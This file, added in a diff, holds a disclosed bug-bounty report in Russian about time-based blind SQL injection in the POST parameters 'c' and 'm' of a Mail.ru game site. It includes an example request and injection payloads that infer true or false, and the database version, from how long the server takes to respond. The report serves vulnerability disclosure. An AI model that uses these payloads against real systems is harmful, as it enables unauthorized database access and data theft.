@@ -1,0 +1,33 @@
+ReportLink:https://hackerone.com/reports/144674
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/konqi
+ReportedTo:Mail.ru(mailru)
+BountyAmount:150.0
+Severity:
+State:Closed
+DateOfDisclosure:06.07.2016 13:28:39
+
+Summary:
+
+Добрый день.
+
+POSТ параметры "c" и "m" (названия контроллера и метода соответственно) уязвимы к атаке типа SQL Injection.
+
+прямого вывода на страницу нет, но можно получить данные ориентируясь на задержку ответа от сервера
+
+если запрос возвращает false - ответ от сервера возвращается быстро.
+если запрос возвращает true - то сервер отвечает очень долго, иногда даже возвращает 504 статусом
+
+Пример эксплуатации
+
+POST / HTTP/1.1
+Host: townwars.mail.ru
+Content-Type: application/x-www-form-urlencoded
+
+c=Registration' or 2=1--  //время ответа - 223мил.
+c=Registration' or 1=1--  //время ответа 60сек (504 timeout)
+
+получаем данные
+
+c=Registration' or substr(version(),1,10)='falsefalse'-- //время ответа 6сек
+c=Registration' or substr(version(),1,10)='PostgreSQL'--  // 60сек (504 timeout)
